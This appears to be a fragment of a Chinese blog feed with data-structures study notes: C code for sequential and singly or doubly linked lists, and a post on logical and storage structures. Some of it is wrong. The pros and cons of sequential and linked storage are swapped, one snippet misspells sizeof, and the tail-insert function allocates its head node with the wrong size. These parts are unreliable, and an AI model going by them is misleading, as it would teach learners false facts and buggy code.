按值查找</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param L</span></span><br><span class="line"><span class="comment"> * @param e</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LocateElem</span><span class="params">(SqList L, ElemType e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; L.length; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (L.data[i] == e) &#123;</span><br><span class="line">            <span class="comment">// 下标为 i 的元素等于 e，返回其位序为 i+1</span></span><br><span class="line">            <span class="keyword">return</span> i+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 按位查找</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param L</span></span><br><span class="line"><span class="comment"> * @param i</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">ElemType <span class="title">GetElem</span><span class="params">(SqList L, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 判断 i 的取值范围是否有效（ 1&lt;=i&lt;=L.length)</span></span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">1</span> || i &gt; L.length) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> L.data[i<span class="number">-1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 打印线性表所有元素</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param L</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintList</span><span class="params">(SqList L)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; L.length; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>, L.data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 判断是否为空</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param L</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Empty</span><span class="params">(SqList L)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (L.length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 销毁操作，释放线性表所占内存空间</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param L</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">DestroyList</span><span class="params">(SqList &amp;L)</span></span>&#123;</span><br><span class="line">    <span class="built_in">free</span>(L.data);</span><br><span class="line">    L.length = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>最好情况：在表尾插入元素，不需要移动元素，时间复杂度为 O(1)<br>最坏情况：在表头插入元素，所有元素依次后移，时间复杂度为 O(n)<br>平均情况：在插入位置概率均等的情况下，平均移动元素的次数为 n/2，时间复杂度为 O(n)</p><p>时间复杂度的计算忽略高阶项的系数，</p><hr><p>scanf 传递时，为什么后台需要给一个地址？<br>其实就是指针传递的使用场景。</p><h2 id="线性表的链式存储"><a href="#线性表的链式存储" class="headerlink" title="线性表的链式存储"></a>线性表的链式存储</h2><p>头指针：链表中第一个结点的存储位置，用来标识单链表<br>头结点：在单链表第一个结点之前附加的一个结点，为了操作上的方便</p><p>若链表有头结点，则头指针永远指向头结点，不论链表是否为空，头指针均不为空，头指针是链表的必须元素，他标识一个链表。</p><p>头结点是为了操作的方便而设立的，其数据域一般为空，或者存放链表的长度。<br>有了头结点之后，对在第一结点钱插入和删除第一结点的操作就统一了，不需要频繁重置头指针。但头结点不是必须的。</p><h3 id="单向链表"><a href="#单向链表" class="headerlink" title="单向链表"></a>单向链表</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"LinkList.hpp"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 头插法建立单链表</span></span><br><span class="line"><span class="comment"> * 思路：建立新的结点分配内存空间，将新结点插入到当前链表的表头</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param L</span></span><br><span class="line"><span class="comment"> * @param a</span></span><br><span class="line"><span class="comment"> * @param n</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">LinkList <span class="title">List_HeadInsert</span><span class="params">(LinkList &amp;L, <span class="keyword">int</span> a[], <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建头结点</span></span><br><span class="line">    L = (LinkList) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span> (LNode));</span><br><span class="line">    <span class="comment">// 初始化链表</span></span><br><span class="line">    L-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    LNode *s;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="comment">// 申请一个新空间给 s</span></span><br><span class="line">        s = (LNode *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span> (LNode));</span><br><span class="line">        s-&gt;data = a[i];</span><br><span class="line">        s-&gt;next = L-&gt;next;</span><br><span class="line">        L-&gt;next = s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 尾插法建立单链表</span></span><br><span class="line"><span class="comment"> * 思路：建立新的结点分配内存空间，将新结点插入到当前链表的表尾</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param L</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">LinkList <span class="title">List_TailInsert</span> <span class="params">(LinkList &amp;L, <span class="keyword">int</span> a[], <span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    L = (LinkList) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(ElemType));</span><br><span class="line">    L-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    LinkList s, r = L;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="comment">// 创建新结点</span></span><br><span class="line">        s = (LNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">        s-&gt;data = a[i];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// r 指向新的表尾结点</span></span><br><span class="line">        r-&gt;next = s;  <span class="comment">// 这一步的目的是保证 r 的 next 指针指向新空间</span></span><br><span class="line">        r = s;        <span class="comment">// 这一步的目的是保证 r 是链表的尾部</span></span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 按位查找操作。获取表 L 中第 i 个位置的元素的值。</span></span><br><span class="line"><span class="comment"> * 思路：在单链表中从第一个结点出发，顺指针next域逐个往下搜索，直到找到第i个结点为止,否则返回最后一个结点指针域NULL。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param L</span></span><br><span class="line"><span class="comment"> * @param i</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">LNode *<span class="title">GetElem</span><span class="params">(LinkList L, <span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 让 P 指向第一个指针</span></span><br><span class="line">    LNode *p = L-&gt;next;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果 i = 0，返回头结点</span></span><br><span class="line">        <span class="keyword">return</span> L;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果 i 小于零，返回 NULL</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (p &amp;&amp; j &lt; i) &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        j ++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 按值查找操作。在表 L 中查找具有给定关键宇值的元素。</span></span><br><span class="line"><span class="comment"> * 思路：从单链表第一个结点开始，由前往后依次比较表中各结点数据域的值，若某结点数据域的值等于给定值e，则返回该结点的指针</span></span><br><span class="line"><span class="comment"> * 若整个单链表中没有这样的结点，则返回NULL。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param L</span></span><br><span class="line"><span class="comment"> * @param e</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">LinkList <span class="title">LocateElem</span><span class="params">(LinkList L, ElemType e)</span> </span>&#123;</span><br><span class="line">    L = L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (L) &#123;</span><br><span class="line">        <span class="keyword">if</span> (L-&gt;data == e) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        L = L-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取链表长度</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param L</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Length</span><span class="params">(LNode *L)</span></span>&#123;</span><br><span class="line">    L = L-&gt;next;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (L) &#123;</span><br><span class="line">        i++;</span><br><span class="line">        L = L-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 打印链表</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param L</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintLinkList</span><span class="params">(LinkList L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    L = L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (L != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%3d"</span>, L-&gt;data);</span><br><span class="line">        L = L-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"LinkList.hpp"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 头插法建立双链表</span></span><br><span class="line"><span class="comment"> * 思路：从四个方向依次进行关联（头结点的前驱、新结点的前驱、新结点的后继、头结点的 next 的前驱）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param DL</span></span><br><span class="line"><span class="comment"> * @param a</span></span><br><span class="line"><span class="comment"> * @param n</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">DLinkList <span class="title">DList_HeadInsert</span><span class="params">(DLinkList &amp;DL, <span class="keyword">int</span> a[], <span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 创建头结点</span></span><br><span class="line">    DL = (DLinkList) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DNode));</span><br><span class="line">    <span class="comment">// 前驱和后继指针都是NULL</span></span><br><span class="line">    DL-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    DL-&gt;prior = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    DNode *s;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        s = (DLinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DNode));   <span class="comment">// 申请新结点</span></span><br><span class="line">        s-&gt;data = a[i];</span><br><span class="line">        s-&gt;next = DL-&gt;next;</span><br><span class="line">        <span class="keyword">if</span> (DL-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            DL-&gt;next-&gt;prior = s;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        s-&gt;prior = DL;</span><br><span class="line">        DL-&gt;next = s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> DL;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 尾插法建立双链表</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param DL</span></span><br><span class="line"><span class="comment"> * @param a</span></span><br><span class="line"><span class="comment"> * @param n</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">DLinkList <span class="title">DList_TailInsert</span><span class="params">(DLinkList &amp;DL, <span class="keyword">int</span> a[], <span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    DL = (DNode *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DNode));</span><br><span class="line"></span><br><span class="line">    DLinkList s, r = DL;</span><br><span class="line">    DL-&gt;prior = <span class="literal">NULL</span>;  <span class="comment">// 前驱指针是NULL</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        s = (DLinkList) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DNode));   <span class="comment">// 申请新结点</span></span><br><span class="line">        s-&gt;data = a[i];</span><br><span class="line">        r-&gt;next = s;</span><br><span class="line">        s-&gt;prior = r;</span><br><span class="line">        r = s;          <span class="comment">// 这一步的目的是为了保证 r 始终是尾指针</span></span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> DL;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 按位查找操作</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param L</span></span><br><span class="line"><span class="comment"> * @param i</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">DNode *<span class="title">GetElemDList</span><span class="params">(DLinkList DL, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (DL &amp;&amp; j &lt; i) &#123;</span><br><span class="line">        DL = DL-&gt;next;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> DL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 按值查找操作</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param L</span></span><br><span class="line"><span class="comment"> * @param e</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">DNode *<span class="title">LocateElemDList</span><span class="params">(DLinkList DL, ElemType e)</span></span>&#123;</span><br><span class="line">    DL = DL-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (DL) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e == DL-&gt;data) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        DL = DL-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> DL;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 打印双链表</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param L</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintDLinkList</span><span class="params">(DLinkList DL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DL = DL-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (DL != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%3d"</span>, DL-&gt;data);</span><br><span class="line">        DL = DL-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构（一）基本概念</title>
      <link href="/data-structure-1-basic-concepts/"/>
      <url>/data-structure-1-basic-concepts/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在计算机科学中，数据结构（英语：data structure）是计算机中存储、组织数据的方式。<br>——<a href="https://zh.wikipedia.org/wiki/数据结构" target="_blank" rel="noopener">维基百科</a></p></blockquote><a id="more"></a><p>数据结构是一种具有一定逻辑关系，在计算机中应用某种存储结构，并且封装了相应操作的数据元素集合。</p><p>它包含三方面的内容，逻辑关系、存储关系及操作。</p><h2 id="逻辑结构"><a href="#逻辑结构" class="headerlink" title="逻辑结构"></a>逻辑结构</h2><p>逻辑结构是指数据元素之间的逻辑关系，即从逻辑关系上描述数据。它与数据的存储无关，是独立于计算机的</p><p>数据的逻辑结构分为线性结构和非线性结构</p><ol><li>集合结构（元素同属于一个集合，元素之间不存在任何关系）</li><li>线性结构（元素只存在一对一的关系）</li><li>树形结构（元素之间存在一种一对多的层次关系）</li><li>图形结构（元素之间存在多对多的关系）</li></ol><h2 id="存储结构"><a href="#存储结构" class="headerlink" title="存储结构"></a>存储结构</h2><p>存储结构是指数据结构在计算机中的表示（又称映像），也称物理结构。它包括数据元素的表示和关系的表示。数据的存储结构是逻辑结构用计算机语言的实现，它依赖于计算机语言。数据的存储结构主要有：顺序存储、链式存储、索引存储和散列存储。</p><p>存储结构可以分为两类：</p><ul><li>顺序存储：存储的物理位置相邻。（p.s. 物理位置即信息在计算机中的位置。）</li><li>链式存储：存储的物理位置未必相邻，通过记录相邻元素的物理位置来找到相邻元素。</li><li>索引存储：类似于目录。</li><li>散列存储：通过关键字直接计算出元素的物理地址。</li></ul><p>C 语言实现顺序存储：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> arr[<span class="number">6</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;  <span class="comment">// 定义数组并初始化</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d \n"</span>, arr[<span class="number">3</span>]);</span><br></pre></td></tr></table></figure><p>顺序结构的优点：</p><ol><li>充分利用所有的存储单元，不会出现碎片现象</li></ol><p>缺点：</p><ol><li>需要额外空间用来存放下一结点的指针</li><li>只能实现顺序存储</li></ol><p>C 语言实现链式存储：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Lnode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Element data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Lnode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;Lnode, *LinkList;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个指针</span></span><br><span class="line">Lnode *L;</span><br><span class="line">L = (LinkList)<span class="built_in">malloc</span>(sizfof(Lnode));</span><br><span class="line">A-&gt;next = B;</span><br><span class="line">B-&gt;next = C;</span><br></pre></td></tr></table></figure><p>链式结构的优点：</p><ol><li>可以实现随机存取</li><li>每个元素占用最少的空间</li></ol><p>缺点：</p><ol><li>只能使用整块的存储单元，会产生较多的碎片</li></ol><p>在上面的例子中，A 只知道 B 的地址，B 只知道 C 的地址，A 不能直接访问到 C，因为它不知道 C 的地址。</p><p>这就是链式结构只能实现顺序存储的原因。</p><h2 id="常用算法"><a href="#常用算法" class="headerlink" title="常用算法"></a>常用算法</h2><p>数据结构研究的内容，就是如何按一定的逻辑结构（线性结构还是树形结构），把数据组织起来，并选择适当的存储结构（顺序存储还是链式存储）把逻辑结构组织好的数据存储到计算机的储存器里。</p><p>算法研究的目的是为了更有效的处理数据，提高数据运算效率。数据的运算是定义在数据的逻辑结构上，但运算的具体实现要在存储结构上进行。一般有以下几种常用运算：</p><ul><li>检索：检索就是在数据结构里查找满足一定条件的节点。一般是给定一个某字段的值，找具有该字段值的节点。</li><li>插入：往数据结构中增加新的节点。</li><li>删除：把指定的结点从数据结构中去掉。</li><li>更新：改变指定节点的一个或多个字段的值。</li><li>排序：把节点按某种指定的顺序重新排列。例如递增或递减。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>02 日志系统：一条SQL更新语句是如何执行的</title>
